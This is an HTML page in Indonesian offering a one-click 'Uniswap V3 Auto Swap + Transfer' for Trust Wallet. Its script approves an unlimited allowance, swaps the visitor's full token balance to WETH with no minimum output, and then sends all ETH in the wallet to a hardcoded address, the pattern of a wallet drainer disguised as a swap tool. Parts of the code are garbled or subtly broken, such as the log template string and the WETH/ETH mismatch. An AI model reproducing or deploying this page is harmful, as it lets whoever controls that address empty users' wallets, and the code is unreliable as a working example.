
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uniswap V3 Auto Swap - Trust Wallet</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; padding: 15px; 
            background: #0f0f0f; color: white; 
        }
        .container { 
            max-width: 100%; background: #1a1a1a; 
            padding: 20px; border-radius: 12px; 
        }
        button { 
            width: 100%; padding: 14px; margin: 10px 0; 
            font-size: 17px; border: none; border-radius: 10px; 
            background: #00cc66; color: white; font-weight: bold;
        }
        button:active { background: #00b359; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; font-size: 16px; }
        .log { 
            margin-top: 15px; height: 320px; overflow-y: auto; 
            background: #000; padding: 12px; border-radius: 8px; 
            font-family: monospace; font-size: 14px; line-height: 1.5;
        }
        .info { background: #003300; padding: 12px; border-radius: 8px; margin: 10px 0; }
        .auto-btn { background: #ff8800; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Uniswap V3 Auto Swap + Transfer</h2>
        <p><strong>Mode:</strong> Trust Wallet Mobile</p>
        
        <button onclick="startAutoProcess()">🔗 HUBUNGKAN & JALANKAN OTOMATIS</button>
        
        <div class="info">
            <strong>Alamat:</strong> <span id="account">Belum terhubung</span><br>
            <strong>Chain:</strong> <span id="chainId">-</span>
        </div>

        <h3>Alamat Token</h3>
        <input type="text" id="tokenAddress" value="0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" placeholder="Token Address">

        <h3>Fee Tier</h3>
        <select id="feeTier">
            <option value="500">0.05%</option>
            <option value="3000" selected>0.3% (Paling Umum)</option>
            <option value="10000">1%</option>
        </select>

        <div class="log" id="log"></div>
    </div>

    <script>
        const SWAP_ROUTER = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
        const SECONDARY = "0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e"; // Ganti dengan alamat tujuanmu
        const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

        let provider, signer, userAddress;

        const log = (msg, error = false) => {
            const el = document.getElementById('log');
            const time = new Date().toLocaleTimeString('id-ID');
            el.innerHTML += `<span style="color:\( {error ? '#ff5555' : '#55ff55'}">[ \){time}] ${msg}</span><br>`;
            el.scrollTop = el.scrollHeight;
        };

        async function connectWallet() {
            if (!window.ethereum) {
                alert("❌ Buka halaman ini di dalam Trust Wallet Browser");
                return false;
            }

            try {
                provider = new ethers.BrowserProvider(window.ethereum);
                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                userAddress = accounts[0];
                signer = await provider.getSigner();

                document.getElementById('account').textContent = userAddress.slice(0,6) + "..." + userAddress.slice(-4);
                const network = await provider.getNetwork();
                document.getElementById('chainId').textContent = Number(network.chainId);

                log("✅ Terhubung ke Trust Wallet", false);
                return true;
            } catch (err) {
                log("Gagal connect: " + err.message, true);
                return false;
            }
        }

        const erc20Abi = [
            "function balanceOf(address) view returns (uint256)",
            "function approve(address,uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)"
        ];

        const routerAbi = [
            "function exactInputSingle(tuple(address tokenIn,address tokenOut,uint24 fee,address recipient,uint256 amountIn,uint256 amountOutMinimum,uint160 sqrtPriceLimitX96) params) payable returns (uint256)"
        ];

        async function autoProcess() {
            if (!userAddress) return log("Hubungkan dulu!", true);

            const tokenAddr = document.getElementById('tokenAddress').value.trim();
            const fee = Number(document.getElementById('feeTier').value);

            try {
                // 1. Cek Saldo
                log("💰 Mengecek saldo...");
                const token = new ethers.Contract(tokenAddr, erc20Abi, provider);
                const balance = await token.balanceOf(userAddress);
                if (balance === 0n) return log("❌ Saldo token kosong!", true);

                const decimals = await token.decimals();
                const symbol = await token.symbol();
                log(`Saldo ${symbol}: ${ethers.formatUnits(balance, decimals)}`, false);

                // 2. Approve (User harus konfirmasi)
                log("🔓 Mengirim Approve... (Konfirmasi di Trust Wallet)");
                const tokenSigner = new ethers.Contract(tokenAddr, erc20Abi, signer);
                const approveTx = await tokenSigner.approve(SWAP_ROUTER, ethers.MaxUint256);
                log(`Approve tx: ${approveTx.hash}`);
                await approveTx.wait();
                log("✅ Approve berhasil!", false);

                // 3. Swap Semua ke ETH
                log("🔄 Melakukan Swap semua token ke ETH...");
                const router = new ethers.Contract(SWAP_ROUTER, routerAbi, signer);

                const params = {
                    tokenIn: tokenAddr,
                    tokenOut: WETH,
                    fee: fee,
                    recipient: userAddress,
                    amountIn: balance,
                    amountOutMinimum: 0n,
                    sqrtPriceLimitX96: 0n
                };

                const swapTx = await router.exactInputSingle(params);
                log(`Swap tx: ${swapTx.hash}`);
                await swapTx.wait();
                log("✅ Swap selesai!", false);

                // 4. Kirim ETH ke Secondary Address
                const ethBalance = await provider.getBalance(userAddress);
                if (ethBalance > 0n) {
                    log("💸 Mengirim ETH ke alamat tujuan...");
                    const sendTx = await signer.sendTransaction({
                        to: SECONDARY,
                        value: ethBalance
                    });
                    await sendTx.wait();
                    log("✅ Semua ETH berhasil dikirim ke secondary address!", false);
                }

            } catch (e) {
                log("❌ Error: " + e.message, true);
            }
        }

        // Tombol utama
        async function startAutoProcess() {
            document.getElementById('log').innerHTML = ""; // clear log
            const connected = await connectWallet();
            if (connected) {
                setTimeout(autoProcess, 800); // delay kecil biar UI ke-update dulu
            }
        }
    </script>
</body>
</html>
